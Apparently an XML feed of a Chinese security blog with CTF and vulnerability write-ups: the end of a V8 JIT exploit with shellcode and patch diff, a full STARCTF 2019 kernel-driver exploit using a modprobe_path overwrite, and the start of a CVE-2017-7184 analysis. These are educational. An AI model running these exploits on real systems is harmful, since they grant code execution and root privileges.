Int64.fromDouble(dv.getFloat64(0x7,true)); console.log("[+] WasmExportedFunctionData addr :"+WasmExportedFunctionData_addr); console.log("step 6: make ArrayBuffer's backing_store -&gt; WasmExportedFunctionData"); arbitraryWrite(mem,WasmExportedFunctionData_addr.asDouble()); WasmInstanceObject_addr = Int64.fromDouble(dv.getFloat64(0xf,true)); console.log("[+] WasmInstanceObject addr :"+WasmInstanceObject_addr); console.log("step 7: make ArrayBuffer's backing_store -&gt; WasmInstanceObject"); arbitraryWrite(mem,WasmInstanceObject_addr.asDouble()); imported_function_targets_addr = Int64.fromDouble(dv.getFloat64(0xc7,true)); console.log("[+] imported_function_targets addr :"+imported_function_targets_addr); console.log("step 8: make ArrayBuffer's backing_store -&gt; imported_function_targets"); arbitraryWrite(mem,imported_function_targets_addr.asDouble()); code_addr = Int64.fromDouble(dv.getFloat64(0,true)); console.log("[+] code addr :"+code_addr); log("step 9: make ArrayBuffer's backing_store -&gt; rwx_area"); arbitraryWrite(mem,code_addr.asDouble()); console.log("step 10: write shellcode for poping up a calculator"); let shellcode_calc = [72, 49, 201, 72, 129, 233, 247, 255, 255, 255, 72, 141, 5, 239, 255, 255, 255, 72, 187, 124, 199, 145, 218, 201, 186, 175, 93, 72, 49, 88, 39, 72, 45, 248, 255, 255, 255, 226, 244, 22, 252, 201, 67, 129, 1, 128, 63, 21, 169, 190, 169, 161, 186, 252, 21, 245, 32, 249, 247, 170, 186, 175, 21, 245, 33, 195, 50, 211, 186, 175, 93, 25, 191, 225, 181, 187, 206, 143, 25, 53, 148, 193, 150, 136, 227, 146, 103, 76, 233, 161, 225, 177, 217, 206, 49, 31, 199, 199, 141, 129, 51, 73, 82, 121, 199, 145, 218, 201, 186, 175, 93]; let write_tmp = new Uint8Array(mem); write_tmp.set(shellcode_calc); console.log("[+] Press Any key to execute Shellcode"); readline(); f();&#125;exploit(); 漏洞补丁漏洞补丁很简单，在commit 52a9e67a477bdb67ca893c25c145ef5191976220中，将CreateObject的flag改为Operator::kNoProperties。 12345678910111213diff --git a/src/compiler/js-operator.cc b/src/compiler/js-operator.ccindex 5ed3f74..94b018c 100644--- a/src/compiler/js-operator.cc+++ b/src/compiler/js-operator.cc@@ -622,7 +622,7 @@ CompareOperationHint CompareOperationHintOf(const Operator* op) &#123; V(CreateKeyValueArray, Operator::kEliminatable, 2, 1) \ V(CreatePromise, Operator::kEliminatable, 0, 1) \ V(CreateTypedArray, Operator::kNoProperties, 5, 1) \- V(CreateObject, Operator::kNoProperties, 1, 1) \+ V(CreateObject, Operator::kNoWrite, 1, 1) \ V(ObjectIsArray, Operator::kNoProperties, 1, 1) \ V(HasProperty, Operator::kNoProperties, 2, 1) \ V(HasInPrototypeChain, Operator::kNoProperties, 2, 1) \ Reference[1] http://phrack.org/papers/jit_exploitation.html [2] https://www.jianshu.com/p/f23c5cad7160 [3] https://ponyfoo.com/articles/an-introduction-to-speculative-optimization-in-v8 [4] https://darksi.de/d.sea-of-nodes/ [5] https://v8.dev/docs/turbofan]]></content>
      <tags>
        <tag>PWN</tag>
        <tag>VULNERABILITY</tag>
        <tag>BROWSER</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[【KERNEL PWN】STARCTF 2019 hackme 解题思路]]></title>
    <url>%2F2019%2F05%2F01%2Fstarctf-2019-hackme%2F</url>
    <content type="text"><![CDATA[关于官方的wp还没有来得及看，这种方法利用的是越解读写问题导致的权限提升，但感觉竞争条件应该也是可以使用的。 相关代码及脚本下载 漏洞分析题目实现了一个驱动程序，其中交互接口实现了ioctl函数——hackme_ioctl。 数据交互以0x20大小的结构体作为交互接口，数据结构如下： 123456789101100000000 arg struc ; (sizeof=0x20, mappedto_3)00000000 ; XREF: hackme_ioctl/r00000000 idx dq ? ; XREF: hackme_ioctl+46/r00000000 ; hackme_ioctl:loc_8E/r ...00000008 user dq ? ; XREF: hackme_ioctl+51/r00000008 ; hackme_ioctl+99/r ...00000010 len dq ? ; XREF: hackme_ioctl+4D/r00000010 ; hackme_ioctl+95/r ...00000018 offset dq ? ; XREF: hackme_ioctl+49/r00000018 ; hackme_ioctl+91/r00000020 arg ends 在ioctl程序中根据操作数的不同实现了四类功能： 0x30001 free 12345678910111213if ( v3 == 0x30001 )&#123; v15 = 2LL * LODWORD(v19.idx); v16 = pool[v15]; v17 = &amp;pool[v15]; if ( v16 ) &#123; kfree(v16, v4); *v17 = 0LL; return 0LL; &#125; return -1LL;&#125; 0x30002 write 1234567891011if ( v3 == 0x30002 )&#123; v9 = 2LL * LODWORD(v19.idx); v10 = pool[v9]; v11 = &amp;pool[v9]; if ( v10 &amp;&amp; v19.offset + v19.len &lt;= (unsigned __int64)v11[1] ) &#123; copy_from_user(v19.offset + v10, v19.user, v19.len); return 0LL; &#125;&#125; 0x30003 read 1234567891011121314else if ( v3 == 0x30003 )&#123; v5 = 2LL * LODWORD(v19.idx); v6 = pool[v5]; v7 = &amp;pool[v5]; if ( v6 ) &#123; if ( v19.offset + v19.len &lt;= (unsigned __int64)v7[1] ) &#123; copy_to_user(v19.user, v19.offset + v6, v19.len); return 0LL; &#125; &#125;&#125; 0x30000 alloc 1234567891011v12 = v19.len;v13 = v19.user;v14 = &amp;pool[2 * LODWORD(v19.idx)];if ( *v14 ) return -1LL;v18 = _kmalloc(v19.len, 0x6000C0LL);if ( !v18 ) return -1LL;*v14 = v18;copy_from_user(v18, v13, v12);v14[1] = v12; 其中，程序维护了一个全局数组pool，其第一个成员记录内核堆地址，第二个成员记录堆的大小，位于驱动的.bss段。不难发现，对于这个数组的存取缺少锁的操作，并且内核以多线程启动，很明显存在竞争类漏洞，如释放内存后立刻竞争读写堆块，造成UAF等。 此外，在read和write功能中存在明显的越界问题： 1234567891011if ( v10 &amp;&amp; v19.offset + v19.len &lt;= (unsigned __int64)v11[1] )&#123; copy_from_user(v19.offset + v10, v19.user, v19.len); return 0LL;&#125; if ( v19.offset + v19.len &lt;= (unsigned __int64)v7[1] ) &#123; copy_to_user(v19.user, v19.offset + v6, v19.len); return 0LL; &#125; 可见，v19.offset为负数时，v19.offset + v19.len可以向上越界读写任意长度的内存。 漏洞利用可见该漏洞的品相是比较好的，因为可以申请任意大小的内存。 在系统保护层面，开启了kaslr、smep和smap。 抛砖引玉最开始看这题的时候觉得还是比较简单的，如果可以提前喷射大量的cred在申请的内存前的话，通过向前越界读就很容易搜索到cred结构体，然后再通过将cred结构体的uid等值置为0，就可以提权了。但是在实际操作中发现了问题，正如之前WCTF题目中提到的，内核cred分配采用了cred_jar这个新的kmem_cache，与kmalloc使用的kmalloc-xx是隔离的，而且在尝试的过程中发现可以找到分配出来的cred结构体，但是在覆写过程中貌似在内存里存在保护的hole，当调用copy_from_user从cred覆写到我们用kmalloc时，会出现kernel panic，提示在写一块non whitelist的内存，这时我们想到如果可以控制驱动模块bss段上的size成员时，就可以局部写，来直接修改结构体了。 强行插入了没有做出来的思路先立个flag，这个cred_jar的坑还没有填上，有空的时候再继续翻翻源码。 地址泄露投机取巧的方法用不了了，那就找常规的漏洞利用思路吧，由于开启了kaslr包含，就先从各个模块的地址入手。 堆地址堆地址泄露相对来说容易，因为我们知道一种向上越界读的方法，那么就可在堆上进行构造了。 基于slub分配器，其释放过的堆块类似于glibc的fastbin，首先是一种后入先出结构，并且其存在FD指针指向下一块空闲的块。 那么，通过如下的方法可以很快得到堆地址： 123456789101112alloc(fd,0,mem,0x100);alloc(fd,1,mem,0x100);alloc(fd,2,mem,0x100);alloc(fd,3,mem,0x100);alloc(fd,4,mem,0x100);delete(fd,1);delete(fd,3);read_from_kernel(fd,4,mem,0x100,-0x100);heap_addr = *((size_t *)mem);printf("[+] heap addr : %16llx\n",heap_addr ); 在释放1、3以前，pool中的内容： 123456pwndbg&gt; x /20gx 0xffffffffc00024000xffffffffc0002400: 0xffff88800017a500 0x00000000000001000xffffffffc0002410: 0xffff88800017a600 0x00000000000001000xffffffffc0002420: 0xffff88800017a700 0x00000000000001000xffffffffc0002430: 0xffff88800017a800 0x00000000000001000xffffffffc0002440: 0xffff88800017a900 0x0000000000000100 释放1、3之后，pool中的内容： 123456pwndbg&gt; x /20gx 0xffffffffc00024000xffffffffc0002400: 0xffff88800017a500 0x00000000000001000xffffffffc0002410: 0x0000000000000000 0x00000000000001000xffffffffc0002420: 0xffff88800017a700 0x00000000000001000xffffffffc0002430: 0x0000000000000000 0x00000000000001000xffffffffc0002440: 0xffff88800017a900 0x0000000000000100 释放的两块堆块中的内容： 12345678pwndbg&gt; x /6gx 0xffff88800017a6000xffff88800017a600: 0xffff88800017aa00 0x41414141414141410xffff88800017a610: 0x4141414141414141 0x41414141414141410xffff88800017a620: 0x4141414141414141 0x4141414141414141pwndbg&gt; x /6gx 0xffff88800017a8000xffff88800017a800: 0xffff88800017a600 0x41414141414141410xffff88800017a810: 0x4141414141414141 0x41414141414141410xffff88800017a820: 0x4141414141414141 0x4141414141414141 可见，利用4号堆块向前越解读就很容易读出堆地址。 内核基址内核基址的读取需要一点猜测的成分在，可知0号内存0xffff88800017a500之前是已经在用的系统块，那么一定存在一些内核的指针。 123456789read_from_kernel(fd,0,mem,0x200,-0x200);kernel_addr = *((size_t *)(mem+0x28)) ;if ((kernel_addr &amp; 0xfff) != 0xae0)&#123; printf("[-] maybe bad kernel leak : %16llx\n",kernel_addr); exit(-1);&#125; kernel_addr -= 0x849ae0; //0x849ae0 - sysctl_table_rootprintf("[+] kernel addr : %16llx\n",kernel_addr ); 从0号块向前越界搜索，可以发现一个内核地址0xffffffff81849ae0 12345pwndbg&gt; x /20gx 0xffff88800017a500-0x2000xffff88800017a300: 0xffff88800017a378 0x00000001000000000xffff88800017a310: 0x0000000000000001 0x00000000000000000xffff88800017a320: 0xffff88800017a378 0xffffffff81849ae00xffff88800017a330: 0xffffffff81849ae0 0xffff888000015100 而这个内核地址利用/proc/kallsyms可以很容易发现属于一个固定函数sysctl_table_root。 12/home/pwn # cat /proc/kallsyms | grep ffffffff81849ae0ffffffff81849ae0 d sysctl_table_root 模块地址在glibc中的fastbin attack常用的方法是劫持fd指针，多次分配后达到任意地址读写的目的。在slub中也可以这样来做。 想要劫持fd指针，可以通过设置offset为负的方式来修改空闲堆块的指针。 要修改到哪里是一个问题，利用已有的内核地址，可以找到一个包含模块指针的内存位置——mod_tree 123456789101112131415/home/pwn # cat /proc/kallsyms | grep mod_treeffffffff8106df00 t __mod_tree_removeffffffff8106e720 t __mod_tree_insertffffffff81811000 d mod_tree/home/pwn # cat /proc/kallsyms | grep hackmeffffffffc0000000 t hackme_ioctl [hackme]ffffffffc0002000 d misc [hackme]ffffffffc0002060 d fops [hackme]ffffffffc0001068 r _note_6 [hackme]ffffffffc0002400 b pool [hackme]ffffffffc0002180 d __this_module [hackme]ffffffffc0000190 t cleanup_module [hackme]ffffffffc0000170 t init_module [hackme]ffffffffc0000190 t hackme_exit [hackme]ffffffffc0000170 t hackme_init [hackme] 123456789pwndbg&gt; x /20gx 0xffffffff818110000xffffffff81811000: 0x0000000000000006 0xffffffffc00023200xffffffff81811010: 0xffffffffc0002338 0xffffffffc00000000xffffffff81811020: 0xffffffffc0006000 0x00000000000000000xffffffff81811030: 0x0000000000000000 0x00000000000000000xffffffff81811040: 0xffffffff81811040 0xffffffff818110400xffffffff81811050: 0xffffffff81811050 0xffffffff818110500xffffffff81811060: 0xffffffff81811060 0xffffffff818110600xffffffff81811070: 0xffffffff81811070 0xffffffff81811070 溢出修改fd以后，可以发现原有第3块内存变为： 1234pwndbg&gt; x /10gx 0xffff88800017a8000xffff88800017a800: 0xffffffff81811040 0x41414141414141410xffff88800017a810: 0x4141414141414141 0x41414141414141410xffff88800017a820: 0x4141414141414141 0x4141414141414141 连续alloc两次以后可以拿到内核地址。 12345678pwndbg&gt; x /20gx 0xffffffffc00024000xffffffffc0002400: 0xffff88800017a500 0x00000000000001000xffffffffc0002410: 0x0000000000000000 0x00000000000001000xffffffffc0002420: 0xffff88800017a700 0x00000000000001000xffffffffc0002430: 0x0000000000000000 0x00000000000001000xffffffffc0002440: 0xffff88800017a900 0x00000000000001000xffffffffc0002450: 0xffff88800017a800 0x00000000000001000xffffffffc0002460: 0xffffffff81811040 0x0000000000000100 此时，我们就可以得到内核模块hackme的基址了。其中在修改时尽量用负数越界读的方法泄露地址，防止复制毁坏数据。 123456789memset(mem,'A',0x100);*((size_t *)mem) = (0x811000 + kernel_addr + 0x40); // mod_tree +0x40write_to_kernel(fd,4,mem,0x100,-0x100);alloc(fd,5,mem,0x100);alloc(fd,6,mem,0x100);read_from_kernel(fd,6,mem,0x40,-0x40);mod_addr = *((size_t *)(mem+0x18)) ;printf("[+] mod addr : %16llx\n",mod_addr ); 内存任意写当泄露了内核基址以后，利用同样的方法，我们可以将保持堆地址大小及堆地址的.bss段上的pool申请下来。 1234567delete(fd,2);delete(fd,5);*((size_t *)mem) = (0x2400 + mod_addr + 0xc0); // mod_tree +0x40write_to_kernel(fd,4,mem,0x100,-0x100);alloc(fd,7,mem,0x100);alloc(fd,8,mem,0x100); // pool 可见，在第8块，我们拿到了自己本身的地址。 1234567891011pwndbg&gt; x /20gx 0xffffffffc00024000xffffffffc0002400: 0xffff88800017a500 0x00000000000001000xffffffffc0002410: 0x0000000000000000 0x00000000000001000xffffffffc0002420: 0x0000000000000000 0x00000000000001000xffffffffc0002430: 0x0000000000000000 0x00000000000001000xffffffffc0002440: 0xffff88800017a900 0x00000000000001000xffffffffc0002450: 0x0000000000000000 0x00000000000001000xffffffffc0002460: 0xffffffff81811040 0x00000000000001000xffffffffc0002470: 0xffff88800017a800 0x00000000000001000xffffffffc0002480: 0xffffffffc00024c0 0x00000000000001000xffffffffc0002490: 0x0000000000000000 0x0000000000000000 这样一个交叠的结构，可以使我们向pool项中增加任意想写的地址和大小，造成任意地址写。 权限提升以上就解决了我们在抛砖引玉章节提出的控制写长度的问题了。在这个部分以后，提升权限的方法有很多，可以参考之前写过的【KERNEL PWN】从内存任意读写到权限提升一文。 在翻wp的过程中，发现一种很有意思的解法，通过任意写修改modprobe_path内容，利用一个非正确格式的ELF文件触发。 1234567891011121314*((size_t *)(mem+0x8)) = 0x100; *((size_t *)mem) = (0x83f960 + kernel_addr ); //ffffffff8183f960 D modprobe_pathwrite_to_kernel(fd,8,mem,0x10,0);strncpy(mem,"/home/pwn/copy.sh\0",18);write_to_kernel(fd,0xc,mem,18,0);system("echo -ne '#!/bin/sh\n/bin/cp /flag /home/pwn/flag\n/bin/chmod 777 /home/pwn/flag' &gt; /home/pwn/copy.sh");system("chmod +x /home/pwn/copy.sh");system("echo -ne '\\xff\\xff\\xff\\xff' &gt; /home/pwn/dummy");system("chmod +x /home/pwn/dummy");system("/home/pwn/dummy");system("cat flag"); 起初依稀记得哪里用到过，后来发现依然来源于dong-hoon you (x82)的New Reliable Android Kernel Root Exploitation Techniques，和之前写过的修改poweroff_cmd异曲同工。 最终结果： 12345678910111213141516171819202122┌─[p4nda@ubuntu] - [~/Desktop/pwn/hackme] - [Wed May 01, 06:36]└─[$] &lt;&gt; ./startvm.sh # # #### ##### ###### # # # # # # ### ### # # ##### # # # # # # # # # # # #### # #~ $ iduid=1000(pwn) gid=1000 groups=1000~ $ cat /fflag fs.sh~ $ cat /flag cat: can't open '/flag': Permission denied~ $ ./exp[+] heap addr : ffffa1d70017a600[+] kernel addr : ffffffffb1e00000[+] mod addr : ffffffffc00fc000/home/pwn/dummy: line 1: ����: not found*CTF&#123;test&#125; EXP123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137#include &lt;stdio.h&gt;#include &lt;pthread.h&gt;#include &lt;unistd.h&gt;#include &lt;stdlib.h&gt;#include &lt;sys/ioctl.h&gt;#include &lt;sys/types.h&gt;#include &lt;sys/stat.h&gt;#include &lt;fcntl.h&gt;#define ALLOC 0x30000#define DEL 0x30001#define READ 0x30003#define WRITE 0x30002struct arg&#123; size_t idx; void *addr; long long len; long long offset;&#125;;void alloc(int fd,int idx,char *user,long long len)&#123; struct arg cmd; cmd.idx = idx; cmd.len = len; cmd.addr = user; ioctl(fd,ALLOC,&amp;cmd);&#125;void delete(int fd,int idx)&#123; struct arg cmd; cmd.idx = idx; ioctl(fd,DEL,&amp;cmd);&#125;void read_from_kernel(int fd,int idx,char *user,long long len,long long offset)&#123; struct arg cmd; cmd.idx = idx; cmd.len = len; cmd.addr = user; cmd.offset = offset; ioctl(fd,READ,&amp;cmd); &#125;void write_to_kernel(int fd,int idx,char *user,long long len,long long offset)&#123; struct arg cmd; cmd.idx = idx; cmd.len = len; cmd.addr = user; cmd.offset = offset; ioctl(fd,WRITE,&amp;cmd); &#125;void print_hex( char *buf,int size)&#123; int i; puts("======================================"); printf("data :\n"); for (i=0 ; i&lt;(size/8);i++)&#123; if (i%2 == 0)&#123; printf("%d",i/2); &#125; printf(" %16llx",*(size_t * )(buf + i*8)); if (i%2 == 1)&#123; printf("\n"); &#125; &#125; puts("======================================");&#125;int main()&#123; int fd = open("/dev/hackme", 0); char *mem = malloc(0x1000); size_t heap_addr , kernel_addr,mod_addr; if (fd &lt; 0)&#123; printf("[-] bad open /dev/hackme\n"); exit(-1); &#125; memset(mem,'A',0x100); alloc(fd,0,mem,0x100); alloc(fd,1,mem,0x100); alloc(fd,2,mem,0x100); alloc(fd,3,mem,0x100); alloc(fd,4,mem,0x100); delete(fd,1); delete(fd,3); read_from_kernel(fd,4,mem,0x100,-0x100); heap_addr = *((size_t *)mem); printf("[+] heap addr : %16llx\n",heap_addr ); read_from_kernel(fd,0,mem,0x200,-0x200); kernel_addr = *((size_t *)(mem+0x28)) ; if ((kernel_addr &amp; 0xfff) != 0xae0)&#123; printf("[-] maybe bad kernel leak : %16llx\n",kernel_addr); exit(-1); &#125; kernel_addr -= 0x849ae0; //0x849ae0 - sysctl_table_root printf("[+] kernel addr : %16llx\n",kernel_addr ); memset(mem,'A',0x100); *((size_t *)mem) = (0x811000 + kernel_addr + 0x40); // mod_tree +0x40 write_to_kernel(fd,4,mem,0x100,-0x100); alloc(fd,5,mem,0x100); alloc(fd,6,mem,0x100); read_from_kernel(fd,6,mem,0x40,-0x40); mod_addr = *((size_t *)(mem+0x18)) ; printf("[+] mod addr : %16llx\n",mod_addr ); delete(fd,2); delete(fd,5); *((size_t *)mem) = (0x2400 + mod_addr + 0xc0); // mod_tree +0x40 write_to_kernel(fd,4,mem,0x100,-0x100); alloc(fd,7,mem,0x100); alloc(fd,8,mem,0x100); // pool //*((size_t *)mem) = (0x83f480 + kernel_addr ); //poweroff_cmd *((size_t *)(mem+0x8)) = 0x100; *((size_t *)mem) = (0x83f960 + kernel_addr ); //ffffffff8183f960 D modprobe_path write_to_kernel(fd,8,mem,0x10,0); strncpy(mem,"/home/pwn/copy.sh\0",18); write_to_kernel(fd,0xc,mem,18,0); system("echo -ne '#!/bin/sh\n/bin/cp /flag /home/pwn/flag\n/bin/chmod 777 /home/pwn/flag' &gt; /home/pwn/copy.sh"); system("chmod +x /home/pwn/copy.sh"); system("echo -ne '\\xff\\xff\\xff\\xff' &gt; /home/pwn/dummy"); system("chmod +x /home/pwn/dummy"); system("/home/pwn/dummy"); system("cat flag");&#125; Reference[1] https://kileak.github.io/ctf/2019/xctf-hackme/ [2] https://github.com/perfectblue/ctf-writeups/tree/master/midnightsun-ctf-2019-quals/HFSIPC [3] New Reliable Android Kernel Root Exploitation Techniques： http://t.cn/Rftu7Dn]]></content>
      <tags>
        <tag>KERNEL</tag>
        <tag>PWN</tag>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux xfrm模块越界读写提权漏洞分析（CVE-2017-7184）]]></title>
    <url>%2F2019%2F02%2F16%2FCVE-2017-7184%2F</url>
    <content type="text"><![CDATA[本次漏洞分析基于Linux 4.4.0-21-generic版本，即Ubuntu 16.04.1。镜像可从此处下载，文中涉及的脚本可从此处下载。 本文的先知链接：https://xz.aliyun.com/t/4133 双机调试环境搭建本次分析没有采用QEMU，而是用了VMware来进行双机调试，给我个人的感觉就是很慢，而且符号表不全很多函数都被编译优化掉了。调试环境构建参考了《ubuntu 内核源码调试方法（双机调试》，由于我已经有了一个调试虚拟机（debugging），所以仅需利用上述镜像构建被调试机（debuggee）。 debugging环境配置由于主要的调试时在debugging上完成的，所以大部分的程序包都需要安装在debugging上。 dbsym安装 这个就是带有符号表的vmlinux文件，需要根据debuggee来确定。 如在debuggee上利用uname -sr命令得到的结果是Linux 4.4.0-21-generic，则需要下载安装vmlinux-4.4.0-21-generic。 首先需要更新源文件，执行命令如下： 123456789101112# 增加source.listcodename=$(lsb_release -c | awk '&#123;print $2&#125;')sudo tee /etc/apt/sources.list.d/ddebs.list &lt;&lt; EOFdeb http://ddebs.ubuntu.com/ $&#123;codename&#125; main restricted universe multiversedeb http://ddebs.ubuntu.com/ $&#123;codename&#125;-security main restricted universe multiversedeb http://ddebs.ubuntu.com/ $&#123;codename&#125;-updates main restricted universe multiversedeb http://ddebs.ubuntu.com/ $&#123;codename&#125;-proposed main restricted universe multiverseEOF# 添加访问符号服务器的秘钥文件wget -O - http://ddebs.ubuntu.com/dbgsym-release-key.asc | sudo apt-key add -# 更新源文件sudo apt-get update 然后利用apt-get下载这个文件： 1sudo apt-get install linux-image-4.4.0-21-generic-dbgsym 然后进入漫长的等待，最终在/usr/lib/debug/boot/vmlinux-4.4.0-21-generic这里可以找到。 源码下载与配置 我采用了比较粗暴的方法，直接下载linux 4.4.0版本的源码，命令如下： 123456# 启用deb-srcdeb-src http://cn.archive.ubuntu.com/ubuntu/ xenial main restricted#搜索源码：apt-cache search linux-source#安装指定版本的源码：sudo apt-get install linux-source-4.4.0 默认下载的源码会放在/usr/src/linux-source-4.4.0/linux-source-4.4.0.tar.bz2。并将其解压到/build/linux-Ay7j_C/linux-4.4.0目录下就可以在调试的时候看到源码。原因是调试符号中包含的路径是编译时的硬编码路径，因此其他Ubuntu版本在调试时可找到这个硬编码路径，将源码解压到此处即可。 设置通信串口 需要为debugging添加通信的串口，其调试原理是两虚拟机通过物理实体机的串口进行通信，远程调试。 对debugging的设置如下，命名管道如果物理机是Windows系统，则为//./pipe/com_1。Linux系统为/tmp/serial。由于存在打印机设备可能占用/dev/ttyS0设备，因此在debugging和debuggee中，我均删除了这个硬件。 编写调试脚本 调试脚本即gdb所执行的命令，用于远程调试debuggee。此脚本需要sudo执行。 123456789gdb \ -ex "add-auto-load-safe-path $(pwd)" \ -ex "file /usr/lib/debug/boot/vmlinux-4.4.0-21-generic" \ -ex 'set arch i386:x86-64:intel' \ -ex 'target remote /dev/ttyS0' \ -ex 'continue' \ -ex 'disconnect' \ -ex 'set arch i386:x86-64' \ -ex 'target remote /dev/ttyS0' debuggee环境配置启动项设置 首先需要在为待调试的内核设置一个新的启动项，使其开机时进入调试模式，等待链接。 具体操作是编辑/etc/grub.d/40_custom，在其中加入 123456789101112131415161718192021222324#!/bin/shexec tail -n +3 $0# This file provides an easy way to add custom menu entries. Simply type the# menu entries you want to add after this comment. Be careful not to change# the 'exec tail' line above.menuentry 'Ubuntu, KGDB with nokaslr' --class ubuntu --class gnu-linux --class gnu --class os $menuentry_id_option 'gnulinux-simple-b5907b23-09bb-4b75-bd51-eb04048e56d8' &#123; recordfail load_video gfxmode $linux_gfx_mode insmod gzio if [ x$grub_platform = xxen ]; then insmod xzio; insmod lzopio; fi insmod part_msdos insmod ext2 set root='hd0,msdos1' if [ x$feature_platform_search_hint = xy ]; then search --no-floppy --fs-uuid --set=root --hint-bios=hd0,msdos1 --hint-efi=hd0,msdos1 --hint-baremetal=ahci0,msdos1 b5907b23-09bb-4b75-bd51-eb04048e56d8 else search --no-floppy --fs-uuid --set=root b5907b23-09bb-4b75-bd51-eb04048e56d8 fi echo 'Loading Linux 4.10.0-19 with KGDB built by GEDU lab...' linux /boot/vmlinuz-4.4.0-21-generic root=UUID=b5907b23-09bb-4b75-bd51-eb04048e56d8 ro find_preseed=/preseed.cfg auto noprompt priority=critical locale=en_US quiet kgdbwait kgdb8250=io,03f8,ttyS0,115200,4 kgdboc=ttyS0,115200 kgdbcon nokaslr echo 'Loading initial ramdisk ...' initrd /boot/initrd.img-4.4.0-21-generic&#125; 其中参数可参考/boot/grub/grub.cfg文件，修改完成后执行sudo update-grub命令。 设置通信串口 debuggee通信串口的设置与 debugging设置类似，区别仅在于debugging是服务器，debuggee是客户机。 进入调试在debugging启动时，按住shift，出现如下界面，选择KGDB with nokaslr。 系统进入远程调试等待。 此时，在debugging中执行sudo ./gdb_kernel，就可以远程调试了。 漏洞分析漏洞位于内核xfrm模块，该模块是IPSEC协议的实现模块。其中xfrm_state结构体用于表示一个SA(Security Associstion)，AH及ESP协议数据包可通过SA进行检查，其数据结构如下： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106struct xfrm_state &#123; possible_net_t xs_net; union &#123; struct hlist_node gclist; struct hlist_node bydst; &#125;; struct hlist_node bysrc; struct hlist_node byspi; atomic_t refcnt; spinlock_t lock; struct xfrm_id id; struct xfrm_selector sel; struct xfrm_mark mark; u32 tfcpad; u32 genid; /* Key manager bits */ struct xfrm_state_walk km; /* Parameters of this state. */ struct &#123; u32 reqid; u8 mode; u8 replay_window; u8 aalgo, ealgo, calgo; u8 flags; u16 family; xfrm_address_t saddr; int header_len; int trailer_len; u32 extra_flags; &#125; props; struct xfrm_lifetime_cfg lft; /* Data for transformer */ struct xfrm_algo_auth *aalg; struct xfrm_algo *ealg; struct xfrm_algo *calg; struct xfrm_algo_aead *aead; const char *geniv; /* Data for encapsulator */ struct xfrm_encap_tmpl *encap; /* Data for care-of address */ xfrm_address_t *coaddr; /* IPComp needs an IPIP tunnel for handling uncompressed packets */ struct xfrm_state *tunnel; /* If a tunnel, number of users + 1 */ atomic_t tunnel_users; /* State for replay detection */ struct xfrm_replay_state replay; struct xfrm_replay_state_esn *replay_esn; /* Replay detection state at the time we sent the last notification */ struct xfrm_replay_state preplay; struct xfrm_replay_state_esn *preplay_esn; /* The functions for replay detection. */ const struct xfrm_replay *repl; /* internal flag that only holds state for delayed aevent at the * moment */ u32 xflags; /* Replay detection notification settings */ u32 replay_maxage; u32 replay_maxdiff; /* Replay detection notification timer */ struct timer_list rtimer; /* Statistics */ struct xfrm_stats stats; struct xfrm_lifetime_cur curlft; struct tasklet_hrtimer mtimer; /* used to fix curlft-&gt;add_time when changing date */ long saved_tmo; /* Last used time */ unsigned long lastused; /* Reference to data common to all the instances of this * transformer. */ const struct xfrm_type *type; struct xfrm_mode *inner_mode; struct xfrm_mode *inner_mode_iaf; struct xfrm_mode *outer_mode; /* Security context */ struct xfrm_sec_ctx *security; /* Private data of this transformer, format is opaque, * interpreted by xfrm_type methods. */ void *data;&#125;; 其中，struct xfrm_id id;用于标识一个SA身份，包含daddr、spi、proto三个参数。 12345struct xfrm_id &#123; xfrm_address_t daddr; __be32 spi; __u8 proto;&#125;; 此外，SA还包括一个xfrm_replay_state_esn结构体，该结构体定义如下。其中bmp是一个边长的内存区域，是一块bitmap，用于标识数据包的seq是否被重放过，其中bmp_len表示变长结构体的大小，replay_window用于seq索引的模数，即索引的范围，此结构体在创建xfrm_state结构体时根据用户输入参数动态被创建，而程序漏洞存在于这个结构体的读写过程中。 123456789struct xfrm_replay_state_esn &#123; unsigned int bmp_len; __u32 oseq; __u32 seq; __u32 oseq_hi; __u32 seq_hi; __u32 replay_window; __u32 bmp[0];&#125;; xfrm_state结构体生成该结构体生成位于xfrm_add_sa函数中，在[1]处对用户输入数据进行参数及协议检查，在[2]处对根据用户输入对结构体进行构造，并放入SA结构体的哈希链表中 12345678910111213141516171819202122232425262728293031323334353637383940static int xfrm_add_sa(struct sk_buff *skb, struct nlmsghdr *nlh, struct nlattr **attrs)&#123; struct net *net = sock_net(skb-&gt;sk); struct xfrm_usersa_info *p = nlmsg_data(nlh); struct xfrm_state *x; int err; struct km_event c;[1] err = verify_newsa_info(p, attrs); //协议及参数检查 if (err) return err;[2] x = xfrm_state_construct(net, p, attrs, &amp;err); if (!x) return err; xfrm_state_hold(x); if (nlh-&gt;nlmsg_type == XFRM_MSG_NEWSA) err = xfrm_state_add(x); else err = xfrm_state_update(x); xfrm_audit_state_add(x, err ? 0 : 1, true); if (err &lt; 0) &#123; x-&gt;km.state = XFRM_STATE_DEAD; __xfrm_state_put(x); goto out; &#125; c.seq = nlh-&gt;nlmsg_seq; c.portid = nlh-&gt;nlmsg_pid; c.event = nlh-&gt;nlmsg_type; km_state_notify(x, &amp;c);out: xfrm_state_put(x); return err;&#125; 在verify_newsa_info函数中，首先根据id.proto协议对用户输入的非兼容性参数进行检查，并对各输入参数中的长度合理性进行检查，我们只关心在[1]处的XFRMA_REPLAY_ESN_VAL数据检查。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879static int verify_newsa_info(struct xfrm_usersa_info *p, struct nlattr **attrs)&#123; int err; err = -EINVAL; switch (p-&gt;family) &#123; case AF_INET: //IPv4 break; case AF_INET6: //IPv6#if IS_ENABLED(CONFIG_IPV6) break;#else err = -EAFNOSUPPORT; goto out;#endif default: goto out; &#125; err = -EINVAL; switch (p-&gt;id.proto) &#123; case IPPROTO_AH:...... break; case IPPROTO_ESP:...... break; case IPPROTO_COMP:...... break;#if IS_ENABLED(CONFIG_IPV6) case IPPROTO_DSTOPTS: case IPPROTO_ROUTING:...... break;#endif default: goto out; &#125; if ((err = verify_aead(attrs))) //XFRMA_ALG_AEAD参数长度检查 goto out; if ((err = 